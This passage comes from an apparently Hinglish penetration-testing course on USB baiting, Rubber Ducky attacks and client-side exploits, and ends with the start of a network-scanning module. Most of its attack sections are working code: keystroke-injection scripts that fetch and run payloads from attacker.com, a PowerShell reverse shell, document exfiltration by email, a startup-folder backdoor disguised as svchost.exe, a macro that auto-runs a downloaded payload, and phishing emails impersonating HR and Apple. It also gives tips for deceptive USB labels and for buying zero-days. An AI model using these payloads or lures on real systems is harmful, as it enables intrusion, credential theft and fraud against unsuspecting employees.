echo "Mike Wilson,$78000,$4000" >> Documents/Salaries_2024.csv

# Copy to USB
cp -r * /media/usb/
```

**Step 2: Label USB Attractively**
```bash
# Physical label ideas:
- "HR Confidential - Salary Info 2024"
- "Executive Bonuses Q4"
- "Company Layoff List - CONFIDENTIAL"
- "CEO Personal Files"
- "IT Department - Passwords"
- "Security Camera Footage"

# Make it look official:
- Print label on professional label maker
- Use company logo (if available)
- Add "CONFIDENTIAL" stamp
- Use expensive-looking USB drive
```

**Step 3: Drop USB in Strategic Location**
```bash
# High-traffic areas:
- Parking lot (near entrance)
- Elevator
- Reception desk
- Break room / Cafeteria
- Conference room
- Bathroom
- Near CEO's office

# Timing:
- Morning (7-9 AM): Employees arriving
- Lunch time (12-1 PM): High foot traffic
- Evening (5-6 PM): Employees leaving

# Quantity:
- Drop 5-10 USBs in different locations
- Increases chance of someone finding it
```

**Step 4: Setup Listener**
```bash
# Start Metasploit
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j

# Wait for victim to plug in USB...
```

**Step 5: Victim Finds USB**
```
Victim's perspective:
1. Finds USB in parking lot
2. Sees label: "HR Confidential - Salary Info 2024"
3. Thinks: "Interesting! Let me check what's inside"
4. Plugs USB into work computer
5. Windows shows: "Removable Disk (E:)"
6. Double-clicks to open
7. Autorun executes payload
8. Sees folder with "Salaries_2024.csv"
9. Opens CSV, sees salary data
10. Thinks: "Wow, I found confidential info!"

Attacker's perspective:
[*] Meterpreter session 1 opened (attacker.com:443 -> victim-ip:49234)

sessions -i 1
meterpreter > sysinfo
Computer: HR-WORKSTATION-05
OS: Windows 10 Pro
Domain: COMPANY
User: hr_manager

meterpreter > shell
# Full access to HR system!
```

**Scenario 2: USB Rubber Ducky - Reverse Shell**

**Step 1: Create DuckyScript Payload**
```bash
# payload.txt - USB Rubber Ducky script (DuckyScript language)
REM ===================================
REM USB Rubber Ducky - Reverse Shell
REM Target: Windows 10
REM ===================================
# REM: Comment (Remark) - script mein notes ke liye

REM Wait for USB to be recognized
DELAY 2000  # 2000 milliseconds (2 seconds) wait karo
# DELAY: Pause execution (USB recognize hone ka time)
# Windows ko USB detect karne ka time dena zaroori hai

REM Open Run dialog
GUI r  # Windows key + R press karo
# GUI: Windows/Command key (macOS mein Command key)
# r: R key press karo
# Result: Run dialog open hoga

DELAY 500  # 500ms wait karo (Run dialog open hone ka time)

REM Download and execute PowerShell payload
STRING powershell -w hidden -ep bypass -c "$c=New-Object Net.WebClient;$c.Proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($c.DownloadString('http://attacker.com/shell.ps1'))"
# STRING: Text type karo (keyboard input simulate)
# powershell: PowerShell launch karo
# -w hidden: Window hidden (victim ko nahi dikhega)
# -ep bypass: Execution policy bypass (scripts run kar sakte hain)
# -c: Command execute karo
# $c=New-Object Net.WebClient: HTTP client create karo
# $c.Proxy=...: Proxy settings configure karo (corporate networks ke liye)
# IEX($c.DownloadString(...)): URL se script download aur execute karo
# 'http://attacker.com/shell.ps1': Attacker ka PowerShell payload

ENTER  # Enter key press karo
# ENTER: Enter/Return key
# Result: PowerShell command execute hoga

REM Clean up
DELAY 1000  # 1 second wait karo (command execute hone ka time)
STRING exit  # "exit" type karo
ENTER  # Enter press karo
# Result: Run dialog close ho jayega
# Total execution time: ~5 seconds
# Victim ko kuch suspicious nahi dikhega!
```

**Step 2: Create PowerShell Payload**
```powershell
# shell.ps1 (host on attacker.com) - PowerShell reverse shell

$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);  # TCP client create karo
# New-Object: New .NET object create karta hai
# System.Net.Sockets.TCPClient: TCP network connection class
# 'attacker.com': Attacker ka domain/IP
# 4444: Attacker ka listening port
# Result: Connection established to attacker

$stream = $client.GetStream();  # Network stream get karo
# GetStream(): TCP connection ka data stream
# Stream se data read/write kar sakte hain

[byte[]]$bytes = 0..65535|%{0};  # Byte array create karo (buffer)
# [byte[]]: Byte array type
# 0..65535: Range (0 to 65535)
# |%{0}: Har element ko 0 se initialize karo
# Result: 65536 bytes ka buffer (data receive karne ke liye)

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){  # Loop: Jab tak data aa raha hai
    # $stream.Read(): Stream se data read karo
    # $bytes: Buffer (data yahan store hoga)
    # 0: Start offset
    # $bytes.Length: Maximum bytes to read
    # -ne 0: Not equal to 0 (jab tak data hai)
    
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);  # Bytes ko string mein convert
    # ASCIIEncoding: ASCII text encoding
    # GetString(): Bytes ko string mein convert karta hai
    # $bytes,0,$i: Buffer, start position, length
    # Result: Attacker ka command (string format mein)
    
    $sendback = (iex $data 2>&1 | Out-String );  # Command execute karo aur output get karo
    # iex: Invoke-Expression (command execute karta hai)
    # $data: Command string
    # 2>&1: Redirect errors to output
    # Out-String: Output ko string mein convert
    # Result: Command ka output
    
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';  # Prompt add karo
    # $sendback: Command output
    # 'PS ': PowerShell prompt
    # (pwd).Path: Current directory path
    # '> ': Prompt symbol
    # Result: "PS C:\Users\victim> " jaisa prompt
    
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);  # String ko bytes mein convert
    # GetBytes(): String ko byte array mein convert
    # Result: Output bytes (network par bhejne ke liye)
    
    $stream.Write($sendbyte,0,$sendbyte.Length);  # Output ko attacker ko bhejo
    # Write(): Stream mein data write karo
    # $sendbyte: Data to send
    # 0: Start offset
    # $sendbyte.Length: Length
    
    $stream.Flush();  # Buffer ko flush karo (immediately send)
    # Flush(): Buffered data ko immediately send karta hai
}
# Loop continues: Attacker commands execute ‚Üí Output send ‚Üí Repeat

$client.Close();  # Connection close karo
# Close(): TCP connection terminate
```

**Step 3: Encode and Flash**
```bash
# Encode DuckyScript
java -jar encoder.jar -i payload.txt -o inject.bin

# Copy to Rubber Ducky SD card
cp inject.bin /media/ducky/

# Eject Rubber Ducky
umount /media/ducky
```

**Step 4: Setup Listener**
```bash
# Netcat listener
nc -lvnp 4444

# Or use Metasploit
msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

**Step 5: Deploy Rubber Ducky**
```bash
# Drop Rubber Ducky in target location
# Label: "Company USB - IT Department"

# Victim plugs in
# Execution time: 5 seconds
# Victim sees: Nothing (too fast!)

# Attacker receives shell:
[*] Command shell session 1 opened

C:\Users\victim> whoami
COMPANY\victim

C:\Users\victim> ipconfig
# Full system access in 5 seconds!
```

**Scenario 3: Advanced Rubber Ducky - Data Exfiltration**

**Step 1: Create Exfiltration Payload**
```bash
# exfiltrate.txt
REM ===================================
REM Data Exfiltration via Email
REM ===================================

DELAY 2000
GUI r
DELAY 500

REM PowerShell to exfiltrate documents
STRING powershell -w hidden -c "$docs=Get-ChildItem -Path $env:USERPROFILE\Documents -Recurse -Include *.docx,*.xlsx,*.pdf | Select-Object -First 10; $body=''; foreach($doc in $docs){$body+=$doc.FullName+\"`n\"}; Send-MailMessage -To 'attacker@gmail.com' -From 'victim@company.com' -Subject 'Documents' -Body $body -SmtpServer 'smtp.company.com'"
ENTER

DELAY 2000
STRING exit
ENTER
```

**Step 2: Victim Plugs Rubber Ducky**
```
Execution:
1. Victim plugs in USB
2. Rubber Ducky types commands (1000 WPM)
3. PowerShell opens (hidden window)
4. Searches for documents
5. Emails list to attacker
6. Closes PowerShell
7. Total time: 8 seconds

Victim sees: Nothing!

Attacker receives email:
Subject: Documents
Body:
C:\Users\victim\Documents\Confidential_Report.docx
C:\Users\victim\Documents\Financial_Data.xlsx
C:\Users\victim\Documents\Customer_List.pdf
C:\Users\victim\Documents\Passwords.txt
...
```

**Scenario 4: Rubber Ducky - Persistent Backdoor**
```bash
# backdoor.txt
REM ===================================
REM Persistent Backdoor Installation
REM ===================================

DELAY 2000
GUI r
DELAY 500

REM Download backdoor and add to startup
STRING powershell -w hidden -c "$wc=New-Object Net.WebClient;$wc.DownloadFile('http://attacker.com/backdoor.exe','$env:APPDATA\svchost.exe');$startup='$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.lnk';$ws=New-Object -ComObject WScript.Shell;$s=$ws.CreateShortcut($startup);$s.TargetPath='$env:APPDATA\svchost.exe';$s.Save();Start-Process '$env:APPDATA\svchost.exe'"
ENTER

DELAY 2000
STRING exit
ENTER

REM Backdoor now runs on every boot!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Rubber Ducky payload ko OS-specific banao:

```bash
# Bad: Generic payload (may fail on different OS)

# Good: Detect OS and run appropriate payload
REM Detect Windows version
DELAY 2000
GUI r
DELAY 500
STRING cmd /c ver > %temp%\ver.txt && type %temp%\ver.txt
ENTER
DELAY 1000

REM Based on version, run specific payload
REM Windows 10: Use PowerShell
REM Windows 7: Use cmd.exe
REM Windows 11: Use new terminal

# Better: Multi-stage payload
REM Stage 1: Quick reconnaissance
STRING powershell -c "Get-ComputerInfo | Out-File $env:temp\info.txt"
ENTER

REM Stage 2: Upload info to attacker
STRING powershell -c "Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -InFile $env:temp\info.txt"
ENTER

REM Stage 3: Download appropriate payload based on info
STRING powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')"
ENTER

# This ensures payload works on target system!
```

**Common Mistake**: USB label too obvious ya suspicious:

```
‚ùå Bad USB Labels:
- "HACK ME"
- "MALWARE"
- "FREE VIRUS"
- "CLICK HERE"
- "SUSPICIOUS USB"

‚úì Good USB Labels:
- "HR Confidential - Salary Info 2024"
- "Executive Meeting Notes"
- "Company Financial Report Q4"
- "IT Department - Software Updates"
- "Security Camera Footage - Jan 15"
- "Employee Performance Reviews"
- "Merger & Acquisition Documents"

Best Practice:
- Use company-specific terminology
- Reference recent events ("Q4 Report", "Jan 15")
- Add "CONFIDENTIAL" or "INTERNAL USE ONLY"
- Make it relevant to target (HR USB near HR dept)
- Use professional label maker
- Add company logo if possible
```

**Real-World Statistics**:

2016 study by University of Illinois:
- Dropped 297 USB drives on campus
- 290 were picked up (98%)
- 135 were plugged into computers (45%)
- Average time to plug in: 6.9 hours

2019 study by Comparitech:
- Tested 200 employees across 10 companies
- 120 plugged in unknown USB (60%)
- 45 executed files on USB (22.5%)
- Only 15 reported to IT (7.5%)

Conclusion: USB baiting remains highly effective!

**Real-World Example**:

2017 mein ek Red Team ne USB Rubber Ducky use karke bank compromise kiya:

Attack Details:
- Dropped 20 Rubber Duckies in bank parking lot
- Label: "Bank Salary Information 2024"
- 8 employees plugged in (40% success rate)
- Rubber Ducky payload: Reverse shell + keylogger
- Execution time: 7 seconds per device
- 8 systems compromised
- Pivoted to internal network
- Accessed customer database
- Total time: 48 hours from USB drop to full access

Bank's Response:
- Implemented USB device control policy
- Security awareness training
- Physical security improvements
- Incident response plan updated

Lesson: Physical security is as important as cyber security!

---

## üìö Topic 8.6: Attack - Client-Side Exploits (Vulnerable Apps)

### üéØ Topic/Technique:
**Client-Side Exploits** - Victim ke system par installed vulnerable applications ko exploit karna for system compromise.

### ü§î Yeh Kya Hai?
Client-side exploits target karte hain user ke computer par running applications - browser, PDF reader, Office applications, media players, etc. Attacker ek malicious file create karta hai (PDF, DOC, video) jo vulnerable application ko exploit karta hai. Jab victim file open karta hai, exploit trigger hota hai aur attacker ko system access mil jata hai - without any executable file running!

**Common Vulnerable Applications:**
- Adobe Reader (PDF exploits)
- Microsoft Office (Macro exploits, CVEs)
- Web Browsers (JavaScript exploits)
- Media Players (VLC, Windows Media Player)
- Image Viewers (JPEG, PNG exploits)
- Archive Tools (ZIP, RAR exploits)

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Demonstrates real-world attack vectors
- Tests patch management processes
- Bypasses traditional antivirus (exploits, not malware)
- Shows importance of application security
- Realistic threat simulation (APT groups use these)
- Tests endpoint protection capabilities

### üéØ Practical Use (Asli Pentesting Mein):
- Initial access in Red Team operations
- Testing application security
- Demonstrating unpatched software risks
- Bypassing email attachment filters
- Exploiting zero-day vulnerabilities
- Targeted attacks on specific users

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Exploit Flow:**
```
1. Attacker identifies vulnerable application on target
2. Creates malicious file exploiting that vulnerability
3. Delivers file to victim (email, USB, download)
4. Victim opens file with vulnerable application
5. Exploit triggers, executes attacker's code
6. Payload runs (reverse shell, backdoor, etc.)
7. System compromised
```

**Why It Works:**
- Users trust document files (PDF, DOC) more than EXE
- Exploits bypass antivirus (no malicious signature)
- Applications run with user privileges
- Many systems have unpatched software
- Users don't expect documents to be dangerous

**Exploit Types:**
```
1. Buffer Overflow: Crash application, execute code
2. Use-After-Free: Memory corruption exploit
3. Heap Spray: JavaScript heap manipulation
4. Return-Oriented Programming (ROP): Bypass DEP/ASLR
5. Logic Bugs: Application logic exploitation
```

### üëç Pros (Fayde):
- Bypasses antivirus (exploit, not malware)
- Users trust document files
- Works on patched OS (if app unpatched)
- No executable file needed
- Can exploit zero-days
- Realistic attack vector
- High success rate with targeted attacks

### üëé Cons (Nuksaan):
- Requires vulnerable application on target
- Exploits may be patched
- Modern exploit mitigations (DEP, ASLR, CFG)
- May crash application (suspicious)
- Requires specific application version
- Zero-days are expensive/rare
- May not work on all systems

### ‚å®Ô∏è Zaroori Commands & Steps:

**Metasploit Browser Exploits:**
```bash
# List browser exploits
msfconsole
search type:exploit platform:windows browser

# Example: Internet Explorer exploit
use exploit/windows/browser/ms14_064_ole_code_execution
set SRVHOST 0.0.0.0
set SRVPORT 80
set URIPATH /
set payload windows/meterpreter/reverse_tcp
set LHOST attacker.com
set LPORT 4444
exploit

# Generates malicious URL
# Send to victim via phishing
```

**Metasploit PDF Exploits:**
```bash
# Adobe Reader exploit
use exploit/windows/fileformat/adobe_pdf_embedded_exe
set FILENAME invoice.pdf
set payload windows/meterpreter/reverse_tcp
set LHOST attacker.com
set LPORT 4444
exploit

# Creates malicious PDF: invoice.pdf
# Send to victim via email
```

**Metasploit Office Exploits:**
```bash
# Microsoft Word exploit
use exploit/windows/fileformat/office_word_hta
set FILENAME report.doc
set payload windows/meterpreter/reverse_tcp
set LHOST attacker.com
set LPORT 4444
exploit

# Creates malicious Word document
```

**Metasploit Listener:**
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

### üíª Step-by-Step Example:

**Scenario 1: Adobe PDF Exploit (CVE-2013-0641)**

**Step 1: Identify Target's PDF Reader**
```bash
# OSINT: Check job postings, company website
# "Required: Adobe Reader 9.0 or higher"

# Or use social engineering
# Call target: "Hi, I'm from IT. What PDF reader version do you use?"

# Or send test PDF with JavaScript
# JavaScript logs version to attacker's server
```

**Step 2: Create Malicious PDF**
```bash
# Start Metasploit
msfconsole

# Use Adobe exploit
use exploit/windows/fileformat/adobe_pdf_embedded_exe

# Configure
set FILENAME Q4_Financial_Report.pdf
set INFILENAME template.pdf  # Use legitimate PDF as template
set payload windows/meterpreter/reverse_https
set LHOST attacker.com
set LPORT 443
set LAUNCH_MESSAGE "Loading document... Please wait."

# Generate
exploit

# Output:
[*] Creating 'Q4_Financial_Report.pdf' file...
[+] Q4_Financial_Report.pdf stored at /root/.msf4/local/Q4_Financial_Report.pdf
```

**Step 3: Setup Listener**
```bash
# In new terminal
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j

# Listener started
```

**Step 4: Deliver Malicious PDF**
```bash
# Send via email
sendemail -f finance@company.com \
-t victim@target.com \
-u "Q4 Financial Report - Review Required" \
-m "Dear Team,

Please review the attached Q4 financial report before tomorrow's board meeting.

Key highlights:
- Revenue up 15%
- Expenses down 8%
- Net profit increased by 23%

Please provide feedback by EOD.

Best regards,
Finance Department" \
-a Q4_Financial_Report.pdf \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password
```

**Step 5: Victim Opens PDF**
```
Victim's perspective:
1. Receives email from "Finance Department"
2. Sees legitimate-looking PDF attachment
3. Downloads Q4_Financial_Report.pdf
4. Double-clicks to open
5. Adobe Reader opens
6. Sees message: "Loading document... Please wait."
7. PDF content displays (looks normal)
8. Continues reading document

Behind the scenes:
1. PDF opens in Adobe Reader
2. Exploit triggers (buffer overflow)
3. Shellcode executes
4. Downloads Meterpreter payload
5. Connects back to attacker
6. All happens in <2 seconds

Attacker's perspective:
[*] Sending stage (200262 bytes) to victim-ip
[*] Meterpreter session 1 opened

sessions -i 1
meterpreter > sysinfo
Computer: FINANCE-PC-05
OS: Windows 10 Pro
User: finance_manager

meterpreter > screenshot
[*] Screenshot saved to: /root/screenshot.png

# Full system access!
```

**Scenario 2: Microsoft Office Macro Exploit**

**Step 1: Create Malicious Word Document**
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_https \
LHOST=attacker.com \
LPORT=443 \
-f vba \
-o macro.vba

# Output: VBA macro code
```

**Step 2: Embed Macro in Word Document**
```vba
' VBA Macro for Microsoft Word - Malicious payload delivery
' Open Microsoft Word
' Create new document with content:
"
CONFIDENTIAL - EMPLOYEE SALARY REVIEW 2024

This document contains sensitive salary information.

To view the content, please enable macros:
1. Click "Enable Content" button above
2. Document will load automatically

If you have questions, contact HR at hr@company.com
"
' Social engineering text (victim ko macros enable karne ke liye convince karta hai)

' Press Alt+F11 (open VBA editor)
' Insert ‚Üí Module
' Paste macro.vba code:

Sub AutoOpen()  ' Function jo automatically execute hota hai jab document open ho
    ' AutoOpen: Word ka built-in event (document open par trigger)
    
    Dim shell As Object  ' Object variable declare karo
    ' Dim: Variable declaration keyword
    ' shell: Variable name
    ' As Object: Generic object type
    
    Set shell = CreateObject("WScript.Shell")  ' WScript.Shell object create karo
    ' Set: Object assignment keyword
    ' CreateObject: COM object create karta hai
    ' "WScript.Shell": Windows Script Host Shell (commands execute karne ke liye)
    
    ' Download and execute payload
    shell.Run "powershell -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')""", 0
    ' shell.Run: Command execute karo
    ' "powershell": PowerShell launch karo
    ' -w hidden: Window hidden (victim ko nahi dikhega)
    ' -c: Command parameter
    ' IEX: Invoke-Expression (downloaded code execute karo)
    ' New-Object Net.WebClient: HTTP client create karo
    ' .DownloadString: URL se content download karo (string format mein)
    ' 'http://attacker.com/payload.ps1': Attacker ka PowerShell script
    ' 0: Window style (0 = hidden, victim ko kuch nahi dikhega)
    ' Result: PowerShell payload silently download aur execute hoga
End Sub  ' Function end

Sub Document_Open()  ' Alternative event (document open par trigger)
    ' Document_Open: Word ka dusra built-in event
    AutoOpen  ' AutoOpen function call karo
    ' Redundancy: Agar ek event fail ho toh dusra kaam karega
End Sub  ' Function end

' Result: Document open hote hi payload execute ho jayega
' Victim ko lagega document load ho raha hai, actually backdoor install ho raha hai!

' Save as: Salary_Review_2024.docm (macro-enabled)
```

**Step 3: Create PowerShell Payload**
```powershell
# payload.ps1 (host on attacker.com)
$client = New-Object System.Net.Sockets.TCPClient('attacker.com',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

**Step 4: Send to Victim**
```bash
sendemail -f hr@company.com \
-t employees@company.com \
-u "URGENT: Salary Review 2024 - Action Required" \
-m "Dear Employee,

Your annual salary review is now available. Please review the attached document and provide feedback by Friday.

IMPORTANT: You must enable macros to view the document.

Best regards,
HR Department" \
-a Salary_Review_2024.docm \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password
```

**Step 5: Victim Enables Macros**
```
Victim's perspective:
1. Opens Salary_Review_2024.docm
2. Word shows: "SECURITY WARNING: Macros have been disabled"
3. Sees document text: "Enable macros to view content"
4. Thinks: "I need to see my salary review"
5. Clicks "Enable Content"
6. Document appears to load normally

Attacker's perspective:
[*] Command shell session 1 opened

PS C:\Users\victim> whoami
COMPANY\victim

PS C:\Users\victim> Get-Process
# Full PowerShell access!
```

**Scenario 3: Browser Exploit (Drive-by Download)**

**Step 1: Setup Malicious Website**
```bash
# Start Metasploit
msfconsole

# Use browser exploit
use exploit/multi/browser/firefox_proto_crmfrequest
set SRVHOST 0.0.0.0
set SRVPORT 80
set URIPATH /
set payload windows/meterpreter/reverse_tcp
set LHOST attacker.com
set LPORT 4444
exploit

# Malicious website running on port 80
[*] Using URL: http://0.0.0.0:80/
[*] Server started
```

**Step 2: Create Attractive Landing Page**
```html
<!-- index.html (served by Metasploit) -->
<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone 15 Giveaway!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 10px;
            max-width: 600px;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéâ Congratulations!</h1>
        <h2>You've Won a FREE iPhone 15 Pro!</h2>
        <p>Click below to claim your prize!</p>
        <button onclick="window.location='/exploit'">Claim Prize Now!</button>
    </div>
    
    <!-- Exploit triggers when user clicks button -->
</body>
</html>
```

**Step 3: Send to Victims**
```bash
# Mass phishing campaign
sendemail -f admin@apple.com \
-t victims@company.com \
-u "You Won an iPhone 15 Pro!" \
-m "Congratulations! You've been selected to receive a FREE iPhone 15 Pro!

Click here to claim: http://attacker.com/

This offer expires in 24 hours!" \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password
```

**Step 4: Victim Visits Website**
```
Victim's perspective:
1. Clicks link in email
2. Website loads (looks legitimate)
3. Clicks "Claim Prize Now!"
4. Browser briefly freezes (1-2 seconds)
5. Page redirects to real Apple website
6. Thinks: "Maybe it was a mistake?"

Attacker's perspective:
[*] Sending exploit to 192.168.1.50 (Firefox 52.0)
[*] Sending stage (200262 bytes)
[*] Meterpreter session 1 opened

meterpreter > sysinfo
Computer: VICTIM-PC
OS: Windows 10
Browser: Firefox 52.0 (vulnerable!)

# System compromised via browser exploit!
```

**Scenario 4: Zero-Day Exploit (Advanced)**

**Step 1: Identify Zero-Day Vulnerability**
```bash
# Research target's software stack
# Find unpatched vulnerability
# Example: Adobe Reader 0-day (CVE-2023-XXXXX)

# Purchase exploit from underground market
# Or develop custom exploit (requires expertise)
```

**Step 2: Weaponize Exploit**
```bash
# Integrate exploit with Metasploit
# Or use standalone exploit framework

# Create malicious PDF with 0-day exploit
python3 exploit_generator.py \
--target adobe_reader_2023 \
--payload meterpreter_reverse_https \
--lhost attacker.com \
--lport 443 \
--output Confidential_Report.pdf

# Output: Weaponized PDF with 0-day exploit
```

**Step 3: Targeted Delivery**
```bash
# Spear phishing to high-value target (CEO, CFO)
# Use OSINT for personalization

sendemail -f board@company.com \
-t ceo@company.com \
-u "CONFIDENTIAL: Board Meeting Minutes - Jan 15" \
-m "Dear Mr. CEO,

Attached are the confidential minutes from today's emergency board meeting regarding the acquisition.

Please review before tomorrow's press conference.

Best regards,
Board Secretary" \
-a Confidential_Report.pdf \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password
```

**Step 4: CEO Opens PDF**
```
Result:
- 0-day exploit triggers
- No antivirus detection (unknown exploit)
- No user warnings (legitimate-looking PDF)
- Full system compromise
- Access to CEO's email, files, credentials
- Potential for complete network takeover

This is how APT groups compromise high-value targets!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Combine multiple exploits for higher success rate:

```bash
# Instead of single exploit, create multi-exploit document

# Example: Malicious PDF with multiple attack vectors
1. PDF exploit (CVE-2013-0641) - for old Adobe Reader
2. Embedded JavaScript - for browser-based PDF viewers
3. Embedded Flash - for Flash-enabled readers
4. Macro in embedded Word doc - if PDF fails
5. Social engineering - "Enable macros to view"

# Benefits:
# - If one exploit fails, others may work
# - Covers multiple application versions
# - Higher success rate (60-70% vs 30-40%)

# Metasploit example:
use auxiliary/fileformat/multidrop
set EXPLOITS adobe_pdf,office_word,flash_player
set PAYLOAD windows/meterpreter/reverse_https
set LHOST attacker.com
set LPORT 443
exploit

# Creates multi-exploit document
```

**Common Mistake**: Using outdated exploits:

```
‚ùå Bad: Using 10-year-old exploits
- CVE-2010-XXXX (Adobe Reader 9)
- CVE-2012-XXXX (Office 2007)
- Most systems patched

‚úì Good: Using recent exploits
- CVE-2021-XXXX (Adobe Reader DC)
- CVE-2022-XXXX (Office 365)
- Higher chance of success

Better: Combining old + new exploits
- Old exploits: Target legacy systems
- New exploits: Target updated systems
- Covers entire attack surface

Best: Using 0-day exploits
- Unknown to vendors
- No patches available
- 90%+ success rate
- Expensive but highly effective
```

**Real-World Example**:

2021 mein ek APT group ne Microsoft Office 0-day (CVE-2021-40444) use karke 100+ organizations compromise kiye:

Attack Details:
- Vulnerability: Office MSHTML Remote Code Execution
- Exploit: Malicious Word document
- Delivery: Spear phishing emails
- Targets: Government, defense, financial sectors
- Success rate: 65% (65 organizations compromised)
- Detection time: 45 days (0-day, no signatures)

Attack Flow:
1. Crafted malicious Word document
2. Embedded exploit in document
3. Sent targeted phishing emails
4. Victims opened documents
5. Exploit triggered automatically
6. Cobalt Strike beacon deployed
7. Full network access achieved

Impact:
- Sensitive data exfiltrated
- Credentials stolen
- Lateral movement across networks
- Persistent backdoors installed

Microsoft's Response:
- Emergency patch released
- Security advisory published
- Threat intelligence shared

Lesson: Client-side exploits remain critical attack vector, especially 0-days!

---

**üéâ Module 8 Complete! üéâ**

Aapne successfully Module 8 (Delivery & Client-Side Exploitation) complete kar liya!

**Topics Covered:**
‚úÖ 8.1: Server-Side vs Client-Side Attacks
‚úÖ 8.2: BeEF (Browser Exploitation Framework)
‚úÖ 8.3: Fake Flash Update / Notification
‚úÖ 8.4: BeEF Hooking (JavaScript Injection)
‚úÖ 8.5: Baiting (Malicious USB / Rubber Ducky)
‚úÖ 8.6: Client-Side Exploits (Vulnerable Apps)

**Key Takeaways:**
- Client-side attacks bypass server security
- Browser exploitation is highly effective
- Physical attacks (USB) remain relevant
- Application vulnerabilities are critical
- Multi-vector attacks increase success rate
- Social engineering + technical exploitation = powerful combination

**Next Module:** Module 9 - Network-Level Attacks (MITM, ARP Spoofing, Bettercap, DNS Spoofing, Wireshark)

=============================================================

# üéØ Module 9: Network-Level Attacks (MITM)

---

## üìö Topic 9.1: Recon - Netdiscover & Zenmap (Network Scanning)

### üéØ Topic/Technique:
**Netdiscover & Zenmap** - Network reconnaissance tools jo network par active devices discover karte hain.

### ü§î Yeh Kya Hai?
**Netdiscover**: ARP-based network scanner jo local network par active devices ko discover karta hai. Yeh passive ya active mode mein kaam kar sakta hai.

**Zenmap**: Nmap ka GUI version jo network scanning ko easy banata hai. Port scanning, OS detection, service enumeration - sab graphical interface mein.

**Purpose**: Network attack se pehle targets identify karna - kaun kaun devices network par hain, unke IP addresses, MAC addresses, aur manufacturers.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Network reconnaissance ka first step
- Target identification (devices, IPs, MACs)
- Network topology mapping
- Attack surface discovery
- MITM attacks ke liye targets select karna
- Network security assessment

### üéØ Practical Use (Asli Pentesting Mein):
- Initial network reconnaissance
- Identifying attack targets
- Network mapping
- Finding vulnerable devices
- Planning MITM attacks
- Documenting network infrastructure

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Netdiscover Working:**
```
1. Sends ARP requests to all IPs in subnet
2. Devices respond with their MAC addresses
3. Netdiscover logs: IP, MAC, Manufacturer
4. Creates list of active devices
```

**Zenmap/Nmap Working:**
```
1. Sends packets to target IPs/ports
2. Analyzes responses
3. Determines: Open ports, services, OS
4. Creates detailed network map
```

### üëç Pros (Fayde):

**Netdiscover:**
- Fast ARP-based discovery
- Passive mode (stealthy)
- Works on local network
- Identifies MAC manufacturers
- Lightweight tool

**Zenmap:**
- User-friendly GUI
- Powerful scanning options
- Visual network topology
- Detailed service detection
- OS fingerprinting
- Save/compare scan results

### üëé Cons (Nuksaan):

**Netdiscover:**
- Only works on local network
- Limited information (IP, MAC only)
- Active mode can be detected
- No port/service information

**Zenmap:**
- Can be detected by IDS/IPS
- Requires more time for detailed scans
- May trigger security alerts
- Blocked by firewalls

### ‚å®Ô∏è Zaroori Commands & Steps:

**Netdiscover Commands:**
```bash
# Basic scan (auto-detect interface)
netdiscover
# Automatically detects network interface and scans

# Scan specific subnet
netdiscover -r 192.168.1.0/24
# -r: Range specify karta hai (192.168.1.0/24 subnet scan karega)

# Passive mode (stealthy)
netdiscover -p
# -p: Passive mode (only listens, doesn't send ARP requests)

# Scan specific interface
netdiscover -i eth0
# -i: Interface specify karta hai (eth0 use karega)

# Fast scan
netdiscover -f
# -f: Fast mode (quickly scan karta hai)

# Output to file
netdiscover -r 192.168.1.0/24 > devices.txt
# >: Output ko file mein save karta hai
```

**Nmap/Zenmap Commands:**
```bash
# Basic scan
nmap 192.168.1.0/24
# Default scan: Top 1000 ports check karta hai

# Ping scan (find live hosts)
nmap -sn 192.168.1.0/24
# -sn: No port scan, only ping (live hosts find karta hai)

# Port scan
nmap -p- 192.168.1.1
# -p-: All 65535 ports scan karta hai

# Service version detection
nmap -sV 192.168.1.1
